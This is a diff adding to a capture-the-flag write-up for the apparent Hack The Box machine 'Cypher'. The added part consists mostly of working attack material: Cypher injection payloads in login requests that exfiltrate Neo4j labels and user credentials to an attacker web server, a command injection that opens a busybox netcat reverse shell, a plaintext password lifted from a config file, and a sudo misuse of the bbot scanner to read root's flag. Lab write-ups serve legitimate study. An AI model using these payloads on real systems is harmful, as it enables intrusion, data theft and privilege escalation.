@@ -175,6 +175,249 @@ Next, we enumerate labels (equivalent to tables in SQL):
 Finds an interesting label: USER.
 
 We then extract credentials:
+```bash
+' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.144:9000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
+```bash
+POST /api/auth HTTP/1.1
+Host: cypher.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 261
+Origin: http://cypher.htb
+Connection: keep-alive
+Referer: http://cypher.htb/login
+Priority: u=0
+
+{"username":"' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.9:9000/?'+label AS b RETURN b//","password":"admin"}
+```
+
+
+```bash
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.10.11.57 - - [15/Mar/2025 04:36:02] "GET /?USER HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:06] "GET /?HASH HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:09] "GET /?DNS_NAME HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:13] "GET /?SHA1 HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:16] "GET /?SCAN HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:18] "GET /?ORG_STUB HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:20] "GET /?IP_ADDRESS HTTP/1.1" 200 -
+
+```
+
+```bash
+POST /api/auth HTTP/1.1
+Host: cypher.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 146
+Origin: http://cypher.htb
+Connection: keep-alive
+Referer: http://cypher.htb/login
+Priority: u=0
+
+{"username":"' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.9:9000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //","password":"admin"}
+```
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.10.11.57 - - [15/Mar/2025 04:36:02] "GET /?USER HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:06] "GET /?HASH HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:09] "GET /?DNS_NAME HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:13] "GET /?SHA1 HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:16] "GET /?SCAN HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:18] "GET /?ORG_STUB HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:36:20] "GET /?IP_ADDRESS HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:37:37] "GET /?name=graphasm HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:21] "GET /?USER HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:22] "GET /?HASH HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:23] "GET /?DNS_NAME HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:25] "GET /?SHA1 HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:28] "GET /?SCAN HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:29] "GET /?ORG_STUB HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:38:30] "GET /?IP_ADDRESS HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:39:26] "GET /?name=graphasm HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:39:58] "GET /?name=graphasm HTTP/1.1" 200 -
+10.10.11.57 - - [15/Mar/2025 04:41:03] "GET /?name=graphasm HTTP/1.1" 200 -
+
+```
+
+```bash
+POST /api/auth HTTP/1.1
+Host: cypher.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 177
+Origin: http://cypher.htb
+Connection: keep-alive
+Referer: http://cypher.htb/login
+Priority: u=0
+
+{"username":
+"a' return h.value as a UNION CALL custom.getUrlStatusCode('http://10.10.16.9:9000;busybox nc 10.10.16.9 1234 -e sh;#') YIELD statusCode AS a RETURN a;//"
+,"password":"admin"}
+```
+
+```bash
+
+                                                                                                                                                           
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.57] 40990
+whoami
+neo4j
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.57] 40990
+whoami
+neo4j
+ls
+bin
+bin.usr-is-merged
+boot
+cdrom
+dev
+etc
+home
+lib
+lib.usr-is-merged
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+sbin.usr-is-merged
+srv
+sys
+tmp
+usr
+var
+cd home
+ls
+graphasm
+cd graphasm
+ls
+bbot_preset.yml
+user.txt
+cat bbot_preset.yml
+targets:
+  - ecorp.htb
+
+output_dir: /home/graphasm/bbot_scans
+
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.20xtCMCXkBmerhK
+```
+
+Inside /home/graphasm/, we find a configuration file bbot_preset.yml, containing:
+
+Using the password, we switch to graphasm and retrieve the user flag.
+```bash
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+neo4j@cypher:/home/graphasm$ ls
+ls
+bbot_preset.yml  user.txt
+neo4j@cypher:/home/graphasm$ su graphasm
+su graphasm
+Password: cU4btyib.20xtCMCXkBmerhK
+
+graphasm@cypher:~$ 
+
+
+
+
+graphasm@cypher:/$ ls
+ls
+bin                dev   lib64              mnt   run                 sys
+bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin                tmp
+boot               home  lost+found         proc  sbin.usr-is-merged  usr
+cdrom              lib   media              root  srv                 var
+graphasm@cypher:/$ cd ~
+cd ~
+graphasm@cypher:~$ ls
+ls
+bbot_preset.yml  user.txt
+graphasm@cypher:~$ cat user.txt
+cat user.txt
+00f133a5f961b68e17a71f0df6abc546
+graphasm@cypher:~$ 
+
+```
+
+Running sudo -l reveals:
+
+Bbot is a recon scanner. Analyzing its script shows it loads files specified as arguments.
+
+```bash
+graphasm@cypher:~$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+Bbot is a multipurpose scanning tool inspired by Spiderfoot, designed for automated reconnaissance. I examined its source code:
+
+Bbot typically scans URLs, but I found that it would process any file provided as input. I tested it using a file named file.txt containing the text "justfile123":
+```bash
+graphasm@cypher:~$ sudo /usr/local/bin/bbot -t /home/graphasm/file.txt
+```
+I then explored Bbot’s help menu and found the -d (debug) option. Hoping it would reveal more details about the file it was processing, I executed:
+```bash
+graphasm@cypher:~$ sudo /usr/local/bin/bbot -t /home/graphasm/file.txt -d
+```
+The debug output included extensive logs, and in the middle of them, I found my file's contents fully exposed.
+
+
+Realizing this vulnerability, I replaced my test file with /root/root.txt to read the root flag:
+
+```bash
+graphasm@cypher:~$ sudo /usr/local/bin/bbot -t /root/root.txt -d
+```
+
+Bbot exposed the contents of root.txt, successfully revealing the root flag.
+
+
+
+
+
+
 
 
 
